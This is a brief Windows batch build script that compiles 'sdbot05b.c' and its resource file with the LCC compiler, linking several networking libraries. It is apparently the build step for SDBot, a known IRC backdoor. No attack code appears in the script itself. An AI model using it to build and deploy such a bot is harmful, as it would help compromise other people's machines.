@echo off
c:\lcc\bin\lrc recource.rc
C:\lcc\bin\lc -O -A -g6 -unused sdbot05b.c -subsystem windows -s sdbot05b.obj recource.res ws2_32.lib wsock32.lib wininet.lib shell32.lib icmp.lib winmm.lib netapi32.lib mpr.lib
pause
echo.
echo.
echo.
pause